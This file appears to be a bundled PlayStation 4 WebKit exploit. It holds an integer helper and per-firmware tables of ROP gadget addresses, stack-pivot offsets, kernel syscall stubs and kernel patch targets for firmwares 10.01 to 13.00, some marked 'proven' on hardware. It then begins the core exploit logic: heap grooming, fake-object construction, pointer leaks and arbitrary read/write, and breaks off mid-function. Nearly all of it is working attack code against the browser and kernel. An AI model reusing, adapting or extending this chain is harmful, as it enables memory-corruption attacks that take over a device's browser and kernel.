/* AUTO-BUNDLED for PS4 WebKit compatibility (no ES modules) */
(function() {
"use strict";

/* === int64.js === */
function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + "";
}

function int64(low, hi) {

    this.low = (low >>> 0);

    this.hi = (hi >>> 0);

    this.backing = null;

    this.add32inplace = function (val) {
        let new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        let new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        this.hi = new_hi;
        this.low = new_lo;
        if (this.backing !== null) {
            if (this.backing.byteLength < val) {
                throw new Error("int64.add32inplace: overflow");
            }

            this.backing = new Uint8Array(this.backing.buffer, val, this.backing.byteLength - val);
        }
    }

    this.add32 = function (val) {
        let new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        let new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        let ret = new int64(new_lo, new_hi);
        if (this.backing !== null) {
            if (this.backing.byteLength < val) {
                throw new Error("int64.add32: overflow");
            }

            ret.backing = new Uint8Array(this.backing.buffer, val, this.backing.byteLength - val);
        }

        return ret;
    }

    this.sub32 = function (val) {
        let new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        let new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32inplace = function (val) {
        let new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        let new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.and32 = function (val) {
        let new_lo = this.low & val;
        let new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }

    this.and64 = function (vallo, valhi) {
        let new_lo = this.low & vallo;
        let new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }

    this.toString = function (radix = 16) {
        let lo_str = (this.low >>> 0).toString(radix);
        let hi_str = (this.hi >>> 0).toString(radix);

        if (this.hi == 0) {
            return lo_str;
        } else {

            const width = radix === 16 ? 8 : Math.ceil(32 / Math.log2(radix));
            lo_str = zeroFill(lo_str, width);
        }

        return hi_str + lo_str;
    }

    return this;
}

globalThis.int64 = int64;


int64;


/* === ps4_offsets.js === */
const REQUIRED_KEYS = [
    "fw_status",
    "wk_expm1_builtin", "wk_JSFunction_m_function",
    "wk_POP_RDI_RET", "wk_POP_RSI_RET", "wk_POP_RDX_RET", "wk_POP_RCX_RET",
    "wk_POP_RAX_RET", "wk_POP_R8_RET", "wk_POP_R9_RET", "wk_LEAVE_RET",
    "wk_MOV_QWORD_PTR_RDI_RAX_RET",
    "wk_MOV_RDI_RSI_30_CALL", "wk_POP_RAX_MOV_RAX_JMP_18",
    "wk_PUSH_RBP_MOV_RBP_RSP_10", "wk_MOV_RDI_RAX_8_CALL_20",
    "wk_MOV_RDX_RAX_18_CALL_10", "wk_PUSH_RDX_POP_RSP_RET",
    "pivot_view_sp", "wk_ArrayBuffer_m_impl", "wk_ArrayBuffer_m_contents_m_data",
    "wk___imp___error", "k__error",
    "k_scan_stage1", "k_scan_stage2",
    "k_evf_cv", "k_sysent_661", "k_jmp_rsi",
];
const OPTIONAL_KEYS = [
    "k_stubs", "wk___imp_pthread_create", "k_pthread_create",
    // Overrides the patch-blob name, which otherwise derives from the firmware
    // key ("13.00" -> patches/1300.bin). Needed when two firmwares share one
    // kernel and therefore one blob.
    "kpatch",
    // Names the firmware this block was copied from. Purely declarative -- no
    // page reads it. tools/checkfw.js needs it: its copy-paste detector flags
    // two firmwares sharing an RVA, and an alias shares EVERY RVA by
    // construction, so without this a correct alias reports as 20 defects and
    // buries a real one.
    "alias_of",
];

const PS4 = {
    "11.00": {

        fw_status: "state=proven step4q=90/0 reboot=0 kernel_rvas=5/5-vs-dump",

        wk_expm1_builtin:      0x2193f30,

        wk_JSFunction_m_function: 0x28,

        wk_CSSFontFace_vtable: 0x3627aa8,

        wk___imp___error:      0x36e1c68,
        k__error:              0x3370,
        wk___imp_strerror:     0x36e1c98,
        c_strerror:            0x10d00,

        wk_POP_RDI_RET:        0x357a0,
        wk_POP_RAX_RET:        0x4e6a9,

        wk_MOV_RDI_RSI_30_CALL:       0x24dae58,

        wk_POP_RAX_MOV_RAX_JMP_18:    0x11d5d53,

        wk_PUSH_RBP_MOV_RBP_RSP_10:   0x2f1890,

        wk_MOV_RDI_RAX_8_CALL_20:     0x41a81,

        wk_MOV_RDX_RAX_18_CALL_10:    0x90ffe6,

        wk_PUSH_RDX_POP_RSP_RET:      0x1cc607a,

        wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x97db,
        wk_LEAVE_RET:                 0x31f9d,

        wk_POP_RSI_RET:        0x249e2,
        wk_POP_RDX_RET:        0x10d11,
        wk_POP_RCX_RET:        0x71617,

        wk_POP_R8_RET:         0xe53a2,
        wk_POP_R9_RET:         0x6403a1,

        pivot_view_sp:                0x18,

        wk_ArrayBuffer_m_impl:        0x10,

        wk_ArrayBuffer_m_contents_m_data: 0x10,

        k_getpid:                     0x1b280,

        k_scan_stage1:                0x40000,
        k_scan_stage2:                0x60000,

        k_evf_cv:                     0x7fc26f,
        k_sysent_661:                 0x1109350,
        k_jmp_rsi:                    0x71a21,
    },

    "11.50": {
        fw_status: "state=proven step4q=90/0 reboot=0 webkit=step7-20/20-x2 "
            + "kernel_rvas=untested-vs-dump kstr_residue=0x318",

        wk_expm1_builtin:                  0x2587bd0,
        wk_JSFunction_m_function:          0x28,

        wk_POP_RDI_RET:                    0x2445241,
        wk_POP_RSI_RET:                    0x2503c9e,
        wk_POP_RDX_RET:                    0x24cfa22,
        wk_POP_RCX_RET:                    0x24c7ebf,
        wk_POP_RAX_RET:                    0x2554e3f,
        wk_POP_R8_RET:                     0x23bb4bd,
        wk_POP_R9_RET:                     0x1c2cda1,
        wk_LEAVE_RET:                      0x23c3790,
        wk_MOV_QWORD_PTR_RDI_RAX_RET:      0x2445d1a,

        wk_MOV_RDI_RSI_30_CALL:            0x29609f8,
        wk_POP_RAX_MOV_RAX_JMP_18:         0x1c8bbc3,
        wk_PUSH_RBP_MOV_RBP_RSP_10:        0x1645270,
        wk_MOV_RDI_RAX_8_CALL_20:          0x1e3f795,
        wk_MOV_RDX_RAX_18_CALL_10:         0x1dea16a,
        wk_PUSH_RDX_POP_RSP_RET:           0x2abe00a,

        pivot_view_sp:                     0x38,
        wk_ArrayBuffer_m_impl:             0x10,
        wk_ArrayBuffer_m_contents_m_data:  0x10,

        wk___imp___error:                  0x3cbcc98,
        k__error:                          0x183c0,

        wk___imp_pthread_create:           0x3cbdbb8,
        k_pthread_create:                  0xa1d0,

        k_stubs: {
            3: 0x2c170,
            4: 0x2b8d0,
            5: 0x2b970,
            6: 0x2d620,
            20: 0x2cb70,
            23: 0x2b6f0,
            24: 0x2d5e0,
            25: 0x2b4d0,
            30: 0x2c9d0,
            54: 0x2cff0,
            92: 0x2b650,
            97: 0x2d050,
            98: 0x2b5f0,
            104: 0x2d380,
            105: 0x2b490,
            106: 0x2d480,
            118: 0x2b2f0,
            135: 0x2c280,
            240: 0x2d4c0,
            331: 0x2c6b0,
            432: 0x2b510,
            466: 0x2cc70,
            487: 0x2ba80,
            488: 0x2bd10,
            538: 0x2b430,
            539: 0x2b4f0,
            544: 0x2beb0,
            545: 0x2ca30,
            632: 0x2d090,
            633: 0x2d840,
            662: 0x2ccb0,
            663: 0x2c3e0,
            664: 0x2d740,
            666: 0x2d540,
            669: 0x2bdf0,
        },
        k_scan_stage1:                     0x40000,
        k_scan_stage2:                     0x60000,

        k_evf_cv:                          0x784318,
        k_sysent_661:                      0x110a760,
        k_jmp_rsi:                         0x704d5,

    },
    "12.00": {
        fw_status: "state=UNTESTED-on-hardware webkit=offline-from-sprx "
            + "anchor=findcaller-validated-on-11.50 "
            + "kernel_rvas=verified-vs-kernel_1202.elf kpatch=10/10-sites-verified",

        wk_expm1_builtin:                   0x2585090,
        wk_JSFunction_m_function:           0x28,

        wk_POP_RDI_RET:                     0x4902f,
        wk_POP_RSI_RET:                     0x10e37,
        wk_POP_RDX_RET:                     0xf7a,
        wk_POP_RCX_RET:                     0x53c0b,
        wk_POP_RAX_RET:                     0x22f53,
        wk_POP_R8_RET:                      0x22f52,
        wk_POP_R9_RET:                      0x60b6c1,
        wk_LEAVE_RET:                       0x11823,
        wk_MOV_QWORD_PTR_RDI_RAX_RET:       0x2b5cb,
        wk_PUSH_RDX_POP_RSP_RET:            0x2abb03a,
        wk_MOV_RDI_RSI_30_CALL:             0x295dcd8,
        wk_POP_RAX_MOV_RAX_JMP_18:          0x8e4873,
        wk_PUSH_RBP_MOV_RBP_RSP_10:         0x285e10,
        wk_MOV_RDI_RAX_8_CALL_20:           0x6c7b0d,
        wk_MOV_RDX_RAX_18_CALL_10:          0xd37cca,

        pivot_view_sp:                      0x38,
        wk_ArrayBuffer_m_impl:              0x10,
        wk_ArrayBuffer_m_contents_m_data:   0x10,

        wk___imp___error:                   0x3cbcc48,
        k__error:                           0x299c0,
        wk___imp_pthread_create:            0x3cbdb80,
        k_pthread_create:                   0x24e00,

        k_stubs: {
            3: 0x2c160,
            4: 0x2b8c0,
            5: 0x2b960,
            6: 0x2d610,
            20: 0x2cb60,
            23: 0x2b6e0,
            24: 0x2d5d0,
            25: 0x2b4c0,
            30: 0x2c9c0,
            54: 0x2cfe0,
            92: 0x2b640,
            97: 0x2d040,
            98: 0x2b5e0,
            104: 0x2d370,
            105: 0x2b480,
            106: 0x2d470,
            118: 0x2b2e0,
            135: 0x2c270,
            240: 0x2d4b0,
            331: 0x2c6a0,
            432: 0x2b500,
            466: 0x2cc60,
            487: 0x2ba70,
            488: 0x2bd00,
            538: 0x2b420,
            539: 0x2b4e0,
            544: 0x2bea0,
            545: 0x2ca20,
            632: 0x2d080,
            633: 0x2d830,
            662: 0x2cca0,
            663: 0x2c3d0,
            664: 0x2d730,
            666: 0x2d530,
            669: 0x2bde0,
        },
        k_scan_stage1:                      0x40000,
        k_scan_stage2:                      0x60000,

        k_evf_cv:                           0x784798,
        k_sysent_661:                       0x110a760,
        k_jmp_rsi:                          0x47b31,
    },
    "13.00": {
        fw_status: "state=proven step10=32/0-x3 reboot=0 webkit=step7-20/20 anchor=findcaller kernel_rvas=verified-on-hardware kpatch=1300.bin-10-sites-verified bug=poops",

        wk_expm1_builtin:                   0x2586880,
        wk_JSFunction_m_function:           0x28,

        wk_POP_RDI_RET:                     0x5c480,
        wk_POP_RSI_RET:                     0x6e45e,
        wk_POP_RDX_RET:                     0x12c5ba,
        wk_POP_RCX_RET:                     0x1bade,
        wk_POP_RAX_RET:                     0x10504,
        wk_POP_R8_RET:                      0x9b311,
        wk_POP_R9_RET:                      0x1dcfb1,
        wk_LEAVE_RET:                       0x182f7,
        wk_MOV_QWORD_PTR_RDI_RAX_RET:       0x548b,
        wk_PUSH_RDX_POP_RSP_RET:            0x2abccaa,
        wk_MOV_RDI_RSI_30_CALL:             0x295f948,
        wk_POP_RAX_MOV_RAX_JMP_18:          0x1d989e3,
        wk_PUSH_RBP_MOV_RBP_RSP_10:         0x25bae0,
        wk_MOV_RDI_RAX_8_CALL_20:           0x4a0406,
        wk_MOV_RDX_RAX_18_CALL_10:          0x1ec3ada,

        pivot_view_sp:                      0x38,
        wk_ArrayBuffer_m_impl:              0x10,
        wk_ArrayBuffer_m_contents_m_data:   0x10,

        wk___imp___error:                   0x3cb8cc8,
        k__error:                           0x26420,
        wk___imp_pthread_create:            0x3cb9c00,
        k_pthread_create:                   0x10110,

        k_stubs: {
            3: 0x2c170,
            4: 0x2b8d0,
            5: 0x2b970,
            6: 0x2d620,
            20: 0x2cb70,
            23: 0x2b6f0,
            24: 0x2d5e0,
            25: 0x2b4d0,
            30: 0x2c9d0,
            54: 0x2cff0,
            92: 0x2b650,
            97: 0x2d050,
            98: 0x2b5f0,
            104: 0x2d380,
            105: 0x2b490,
            106: 0x2d480,
            118: 0x2b2f0,
            135: 0x2c280,
            240: 0x2d4c0,
            331: 0x2c6b0,
            432: 0x2b510,
            466: 0x2cc70,
            487: 0x2ba80,
            488: 0x2bd10,
            538: 0x2b430,
            539: 0x2b4f0,
            544: 0x2beb0,
            545: 0x2ca30,
            632: 0x2d090,
            633: 0x2d840,
            662: 0x2ccb0,
            663: 0x2c3e0,
            664: 0x2d740,
            666: 0x2d540,
            669: 0x2bdf0,
        },
        k_scan_stage1:                      0x40000,
        k_scan_stage2:                      0x60000,

        k_kl_lock:                          0xe6c20,

        k_evf_cv:                           0x0,
        k_sysent_661:                       0x110a760,
        k_jmp_rsi:                          0x47b31,
    },
    "12.50": {
        fw_status: "state=UNTESTED-on-hardware "
            + "webkit=addfw-from-decrypted-12.50-modules (15/15 gadgets, 35/35 stubs) "
            + "anchor=findcaller-offline (self-check reproduces the known 11.50 and "
            + "12.00 anchors) "
            + "kernel_rvas=asserted-by-supplied-table UNVERIFIED (no 12.50 kernel dump; "
            + "equal to 13.00's row, which came from the same table) "
            + "kpatch=1250.bin bug=poops",

        wk_expm1_builtin:                   0x2585110,   // the anchor
        wk_JSFunction_m_function:           0x28,

        wk_POP_RDI_RET:                     0x4902f,   // 5f c3
        wk_POP_RSI_RET:                     0x10e37,   // 5e c3
        wk_POP_RDX_RET:                     0x771ea,   // 5a c3
        wk_POP_RCX_RET:                     0x5def9,   // 59 c3
        wk_POP_RAX_RET:                     0x22f53,   // 58 c3
        wk_POP_R8_RET:                      0x22f52,   // 47 58 c3
        wk_POP_R9_RET:                      0x60b6c1,   // 47 59 c3
        wk_LEAVE_RET:                       0x77caa,   // c9 c3
        wk_MOV_QWORD_PTR_RDI_RAX_RET:       0x2b5cb,   // 48 89 07 c3
        wk_PUSH_RDX_POP_RSP_RET:            0x2abb0ba,   // 52 5c c3
        wk_MOV_RDI_RSI_30_CALL:             0x295dd58,   // 48 8b 7e 30 48 8b 07 ff 10
        wk_POP_RAX_MOV_RAX_JMP_18:          0x8e4873,   // 58 48 8b 07 ff 60 18
        wk_PUSH_RBP_MOV_RBP_RSP_10:         0x285e10,   // 55 48 89 e5 48 8b 07 ff 50 10
        wk_MOV_RDI_RAX_8_CALL_20:           0x6c7b0d,   // 48 8b 78 08 48 8b 07 ff 50 20
        wk_MOV_RDX_RAX_18_CALL_10:          0xd37cca,   // 48 8b 50 38 48 8b 07 ff 50 10

        pivot_view_sp:                      0x38,   // read off G4's displacement
        wk_ArrayBuffer_m_impl:              0x10,
        wk_ArrayBuffer_m_contents_m_data:   0x10,

        wk___imp___error:                   0x3cb4c48,
        k__error:                           0xd9d0,
        wk___imp_pthread_create:            0x3cb5b80,
        k_pthread_create:                   0x23d20,

        k_stubs: {
            3: 0x2c160,   // read
            4: 0x2b8c0,   // write
            5: 0x2b960,   // open
            6: 0x2d610,   // close
            20: 0x2cb60,   // getpid
            23: 0x2b6e0,   // setuid
            24: 0x2d5d0,   // getuid
            25: 0x2b4c0,   // geteuid
            30: 0x2c9c0,   // accept
            54: 0x2cfe0,   // ioctl
            92: 0x2b640,   // fcntl
            97: 0x2d040,   // socket
            98: 0x2b5e0,   // connect
            104: 0x2d370,   // bind
            105: 0x2b480,   // setsockopt
            106: 0x2d470,   // listen
            118: 0x2b2e0,   // getsockopt
            135: 0x2c270,   // socketpair
            240: 0x2d4b0,   // nanosleep
            331: 0x2c6a0,   // sched_yield
            432: 0x2b500,   // thr_self
            466: 0x2cc60,   // rtprio_thread
            487: 0x2ba70,   // cpuset_getaffinity
            488: 0x2bd00,   // cpuset_setaffinity
            538: 0x2b420,   // evf_create
            539: 0x2b4e0,   // evf_delete
            544: 0x2bea0,   // evf_set
            545: 0x2ca20,   // evf_clear
            632: 0x2d080,   // thr_suspend_ucontext
            633: 0x2d830,   // thr_resume_ucontext
            662: 0x2cca0,   // aio_multi_delete
            663: 0x2c3d0,   // aio_multi_wait
            664: 0x2d730,   // aio_multi_poll
            666: 0x2d530,   // aio_multi_cancel
            669: 0x2bde0,   // aio_submit_cmd
        },
        k_scan_stage1:                      0x40000,
        k_scan_stage2:                      0x60000,

        // KERNEL RVAs -- not derivable from userland modules. These are the
        // supplied 12.50 table, which is identical to our 13.00 row on every
        // key we carry. Not independently verified: there is no 12.50 kernel
        // dump here. step4q byte-gates sysent/jmp before firing either.
        //
        // The table also carries PRISON0 and ROOTVNODE. We deliberately do NOT
        // store those -- chain_poops.js:1722 reads prison0 out of the live
        // kernel via curproc->ucred->cr_prison, so a wrong constant cannot
        // exist to be wrong. Its EVF_OFFSET/TARGET_ID_OFFSET are 0 because
        // netctrl does not use them, which matches k_evf_cv below.
        k_evf_cv:                           0x0,      // unused by poops
        k_sysent_661:                       0x110a760,
        k_jmp_rsi:                          0x47b31,
        k_kl_lock:                          0xe6c20,  // kernel_base = kl_lock - this
    },
    "10.01": {
        fw_status: "state=UNTESTED-on-hardware "
            + "webkit=addfw-from-decrypted-10.01-modules (15/15 gadgets, 35/35 "
            + "stubs, both SELFs pass their self_ex_info digest) "
            + "anchor=findcaller-offline (the same run reproduces 11.50's "
            + "hardware-verified anchor) "
            + "kernel=kernel_1001.elf out of the 10.01 PUP (fw 10.010.000 retail), "
            + "BUILD OUTPUT so file offset == RVA + 0x181000, not the dump rule; "
            + "mapping fixed by swapgs at RVA 0x1c0 + 18/18 GoldHEN-1001 kernel "
            + "functions on a prologue "
            + "kernel_rvas=evf_cv+jmp_rsi-VERIFIED-vs-kernel_1001.elf, "
            + "sysent_661-cross-derived (GoldHEN 1001 sysent 0x1102d90 + 661*0x30; "
            + "same arithmetic reproduces the proven 11.00 and 11.50 rows), "
            + "no-kl_lock-because-lapse "
            + "kpatch=1001.bin-11/11-sites-hold-a-short-conditional-jump-in-kernel_1001.elf "
            + "bug=lapse",

        wk_expm1_builtin:                   0x218bb70,
        wk_JSFunction_m_function:           0x28,

        wk_POP_RDI_RET:                     0x51056,
        wk_POP_RSI_RET:                     0xbe86,
        wk_POP_RDX_RET:                     0x1644b2,
        wk_POP_RCX_RET:                     0x782ab,
        wk_POP_RAX_RET:                     0xe882,
        wk_POP_R8_RET:                      0xe881,
        wk_POP_R9_RET:                      0x947b91,
        wk_LEAVE_RET:                       0x2ca6c3,
        wk_MOV_QWORD_PTR_RDI_RAX_RET:       0xc037,
        wk_PUSH_RDX_POP_RSP_RET:            0x168bc7a,
        wk_MOV_RDI_RSI_30_CALL:             0x24d28f8,
        wk_POP_RAX_MOV_RAX_JMP_18:          0xaa6d13,
        wk_PUSH_RBP_MOV_RBP_RSP_10:         0x830f70,
        wk_MOV_RDI_RAX_8_CALL_20:           0xdca531,
        wk_MOV_RDX_RAX_18_CALL_10:          0x68b090,

        pivot_view_sp:                      0x18,
        wk_ArrayBuffer_m_impl:              0x10,
        wk_ArrayBuffer_m_contents_m_data:   0x10,

        wk___imp___error:                   0x36d1bf0,
        k__error:                           0x14f40,
        wk___imp_pthread_create:            0x36d2b40,
        k_pthread_create:                   0x29680,

        k_stubs: {
            3: 0x2bef0,
            4: 0x2c780,
            5: 0x2c740,
            6: 0x2d5f0,
            20: 0x2b080,
            23: 0x2c080,
            24: 0x2c900,
            25: 0x2bc10,
            30: 0x2bc90,
            54: 0x2b0c0,
            92: 0x2b840,
            97: 0x2b1f0,
            98: 0x2ce50,
            104: 0x2c390,
            105: 0x2d190,
            106: 0x2c120,
            118: 0x2bad0,
            135: 0x2ba30,
            240: 0x2c2e0,
            331: 0x2b3b0,
            432: 0x2c1c0,
            466: 0x2d310,
            487: 0x2afe0,
            488: 0x2be50,
            538: 0x2afa0,
            539: 0x2b820,
            544: 0x2ca70,
            545: 0x2d2d0,
            632: 0x2c7e0,
            633: 0x2ba10,
            662: 0x2cf50,
            663: 0x2b910,
            664: 0x2b060,
            666: 0x2d390,
            669: 0x2b7e0,
        },
        k_scan_stage1:                      0x40000,
        k_scan_stage2:                      0x60000,

        k_evf_cv:                           0x7b5133,
        k_sysent_661:                       0x110a980,
        k_jmp_rsi:                          0x68b1,
    },
};

// 12.02 IS 12.00 for everything this table describes. The 12.00 block's own
// fw_status reads "kernel_rvas=verified-vs-kernel_1202.elf" -- those offsets
// were derived from the 12.02 kernel in the first place. Same WebKit gadgets,
// same kernel RVAs, same ten patch sites, so it takes the same blob
// (patches/1200.bin) rather than a 1202.bin that does not exist.
//
// A copy rather than a shared reference, so its fw_status can say where the
// data came from without rewriting 12.00's.
PS4["12.02"] = Object.assign({}, PS4["12.00"], {
    alias_of: "12.00",
    fw_status: "state=UNTESTED-on-hardware shares=12.00 "
        + "kernel_rvas=verified-vs-kernel_1202.elf (this firmware) "
        + "kpatch=1200.bin-10-sites-verified bug=lapse",
    kpatch: "1200.bin",
});

// 12.52 IS 12.50, per the supplied table -- same kernel row, and the WebKit
// side is taken from the single Lib_dump/12.50 module set because that is the
// only 12.5x dump we have. The kernel half of that claim is consistent with
// what we already believed (12.50's row equals 13.00's); the WebKit half is an
// ASSERTION, not a measurement. If a 12.52 libSceNKWebKit.sprx ever turns up,
// re-derive with tools/addfw.js and compare -- a moved anchor would fail at
// stage 1, loudly and harmlessly, rather than corrupting anything.
//
// Takes patches/1250.bin, since a 1252.bin does not exist.
PS4["12.52"] = Object.assign({}, PS4["12.50"], {
    alias_of: "12.50",
    fw_status: "state=UNTESTED-on-hardware shares=12.50 "
        + "webkit=assumed-identical-to-12.50 (no 12.52 module dump) "
        + "kernel_rvas=asserted-by-supplied-table UNVERIFIED "
        + "kpatch=1250.bin bug=poops",
    kpatch: "1250.bin",
});

function offsetsFor(uaString) {
    const m = (uaString || "").match(/PlayStation\s+4[\/ ](\d+)\.(\d+)/);
    if (!m) return { key: null, off: null };

    const key = m[1] + "." + parseInt(m[2], 16).toString(16).padStart(2, "0");
    return { key, off: PS4[key] || null };
}


/* === core.js === */
let DRAIN_COUNT = 512;
const AUTO_RETRY_DELAY_MS = 50;

const K = 2;
const DUPLICATE_INDEX = 2;
const CONTROL_INDEX = 0xffff;
const CONTROL_INT = -64000;
const FILLER_BIGINTS = K - 1;
const FILLER_OBJECTS = 0xfffe - K;
const EXPECTED_LENGTH = 0x50001;
const CELL_BYTES = 0x30;
const FUNCTION_BYTES = 0x20;
const NATIVE_EXECUTABLE_BYTES = 0x38;
const HOLDER_BYTES = 0x40;

const CARRIER_SLOTS = (function () {
    try {
        const q = new URLSearchParams(location.search).get("slots");
        const n = q ? parseInt(q, 10) : 0;
        if (n >= 100000 && n <= 40000000) return n;
    } catch (e) { }
    return 12000000;
})();
const CARRIER_BYTES = CARRIER_SLOTS * 8;
const CAPTURE_DELAY_MS = 50;
const COMPOSE_DELAY_MS = 100;

const symbolToString = Symbol.prototype.toString;

const _gOverride = (function () {
    const out = {};
    try {
        const q = new URLSearchParams(location.search).getAll("g");
        for (const item of q) {
            const [k, v] = item.split(":");
            const n = v && v.startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
            if (k && n > 0) out[k] = n;
        }
    } catch (e) { }
    return out;
})();
const _g = (name, dflt) => (typeof _gOverride[name] === "number" ? _gOverride[name] : dflt);
if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;

const DRAIN_SIZE = _g("drainsz", 0x10000);
const SLAB_SIZE = _g("slab", 0x400000);
const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x81000);
const SEPARATOR_SIZE = _g("sep", 0x10000);
const EARLY_HOLE_SIZE = _g("early", 0x70000);
const GUARD_SIZE = _g("guard", 0x90000);
const PREDECESSOR_SIZE = _g("pred", 0x80000);
const FINAL_HOLE_SIZE = _g("final", 0x80000);

const RW_BUFFER_SIZE = 0x100;

const IDENT_OFFSET = 0x20;

const LEAK_SLOT_INDEX = 2;
const LEAK_SLOT_OFFSET = 0x10 + 8 * LEAK_SLOT_INDEX;

const REVISION = "slopkit-core-1";
const attemptKey = `${REVISION}:attempts`;

const burstKey = `${REVISION}:burst`;

const rwHeader = new Uint8Array(CELL_BYTES);
const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
const holderHeader = new Uint8Array(HOLDER_BYTES);
const scratchBits = new ArrayBuffer(8);
const scratchBytes = new Uint8Array(scratchBits);
const scratchWords = new Uint32Array(scratchBits);
const scratchDouble = new Float64Array(scratchBits);

const identityMagic = new Uint8Array([0x5a, 0xa5, 0xc3, 0x3c,
    0xde, 0xad, 0xbe, 0xef]);
const identityBytes = new Uint8Array(8);

let attemptNumber = 0;
let attemptCeiling = 0;
let keepIndex = 0;
let stopped = false;
let keepAlive = null;
let onEvent = null;
let criticalBarrier = null;
let settleResolve = null;
let settleReject = null;
let running = false;

let referenceTarget = null;
let rwBuffer = null;
let rwView = null;
let rwMirror = null;
let targetBuffer = null;
let targetView = null;
const nativeTarget = parseInt;
let fakeHost = null;
let lengthWord = null;
let anchorElement = null;
let markerObjectA = null;
let markerObjectB = null;
let targetHolder = null;
let holderGuardA = null;
let holderGuardB = null;
let fillerGraph = null;
let outerGraph = null;

let leakedScope = null;
let getterCarrier = null;
let preparedSymbolObject = null;
let capturedString = null;
let capturedWords = null;
let copiedLength = 0;
let captureState = 0;
let captureError = null;
let hostAddress = NaN;
let fakeAddress = NaN;

let predecessorWords = null;
let pointerLow = 0;
let pointerHigh = 0;
let targetAddress = NaN;
let targetAddressLow = 0;
let targetAddressHigh = 0;
let nativeTargetAddress = NaN;
let anchorElementAddress = NaN;
let markerAAddress = NaN;
let markerBAddress = NaN;

let rwOriginalVector = NaN;
let rwHeaderOK = false;
let holderHeaderOK = false;
let functionHeaderOK = false;
let nativeExecutableHeaderOK = false;
let functionStructureID = 0;
let nativeExecutableStructureID = 0;
let executableAddress = NaN;
let nativeFunctionAddress = NaN;
let nativeConstructorAddress = NaN;
let pointersRepeated = false;
let restoreObserved = false;
let retrySafe = false;
let retryScheduled = false;
let attemptPersisted = false;
let candidateEverReturned = false;
let candidateMutationStarted = false;
let zeroHeaderMiss = false;
let identityResult = 0;

let compositionState = 0;
let compositionLength = 0;
let compositionError = null;

let liveCandidate = null;
let fakeReleased = false;

const UNSEEN = -1;
const profile = {

    carrierSID: UNSEEN, carrierType: UNSEEN, carrierFlags: UNSEEN,
    carrierMode: UNSEEN, carrierByte28: UNSEEN,
    holderSID: UNSEEN, holderType: UNSEEN, holderFlags: UNSEEN,
    functionSID: UNSEEN, functionType: UNSEEN, functionFlags: UNSEEN,
    nativeExecSID: UNSEEN, nativeExecType: UNSEEN, nativeExecFlags: UNSEEN,
    cellSize: UNSEEN,

    vectorOffset: 0x10, inlineSlotOffset: 0x10, butterflyOffset: 0x08,
    vectorOffsetMeasured: false
};

function resetProfile() {
    profile.carrierSID = UNSEEN; profile.carrierType = UNSEEN;
    profile.carrierFlags = UNSEEN; profile.carrierMode = UNSEEN;
    profile.carrierByte28 = UNSEEN;
    profile.holderSID = UNSEEN; profile.holderType = UNSEEN;
    profile.holderFlags = UNSEEN;
    profile.functionSID = UNSEEN; profile.functionType = UNSEEN;
    profile.functionFlags = UNSEEN;
    profile.nativeExecSID = UNSEEN; profile.nativeExecType = UNSEEN;
    profile.nativeExecFlags = UNSEEN;
}

function hex(value) {
    return `0x${value.toString(16)}`;
}

function buffer(size) {
    return new ArrayBuffer(size);
}

function allZero(bytes, start, end) {
    for (let i = start; i < end; ++i) {
        if (bytes[i] !== 0)
            return false;
    }
    return true;
}

function uint32At(bytes, offset) {
    return bytes[offset]
        + bytes[offset + 1] * 0x100
        + bytes[offset + 2] * 0x10000
        + bytes[offset + 3] * 0x1000000;
}

function low48At(bytes, offset) {
    return bytes[offset]
        + bytes[offset + 1] * 0x100
        + bytes[offset + 2] * 0x10000
        + bytes[offset + 3] * 0x1000000
        + bytes[offset + 4] * 0x100000000
        + bytes[offset + 5] * 0x10000000000;
}

function readBytes(destination, source, count) {
    for (let i = 0; i < count; ++i)
        destination[i] = source[i];
}

function sameBytes(left, right, count) {
    for (let i = 0; i < count; ++i) {
        if (left[i] !== right[i])
            return false;
    }
    return true;
}

function readTwiceMatches(destination, source, count) {
    readBytes(destination, source, count);
    return sameBytes(destination, source, count);
}

function aimCarrier(candidate, address) {
    const high = Math.floor(address / 0x100000000);
    scratchWords[0] = address - high * 0x100000000;
    scratchWords[1] = high;
    for (let i = 0; i < 8; ++i)
        candidate[0x10 + i] = scratchBytes[i];
}

function restoreCarrier(candidate) {
    for (let i = 0; i < 8; ++i)
        candidate[0x10 + i] = rwHeader[0x10 + i];
}

function pointerFromWords(words, offset) {
    if (words[offset + 3] !== 0)
        return NaN;
    return words[offset]
        + words[offset + 1] * 0x10000
        + words[offset + 2] * 0x100000000;
}

function plausibleCell(value) {
    return value > 0x100000000
        && value <= 0xffffffffffff
        && value <= 9007199254740991
        && Math.floor(value) === value
        && value % 8 === 0;
}

function plausibleAddress(value) {
    return value > 0x100000000
        && value <= 0xffffffffffff
        && value <= 9007199254740991
        && Math.floor(value) === value;
}

function canonicalLow48(bytes, offset) {
    return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}

function dumpHex(bytes, count) {
    let out = "";
    for (let i = 0; i < count; ++i)
        out += bytes[i].toString(16).padStart(2, "0");
    return out;
}

function encodedHeaderNumber() {
    const raw = new ArrayBuffer(8);
    const u32 = new Uint32Array(raw);
    const f64 = new Float64Array(raw);
    u32[0] = 0x00004250;
    u32[1] = 0x01062800;
    return f64[0];
}

function emit(tag, detail) {
    if (onEvent === null)
        return;
    try { onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber); }
    catch {  }
}

function checkCarrierIdentity(candidate) {
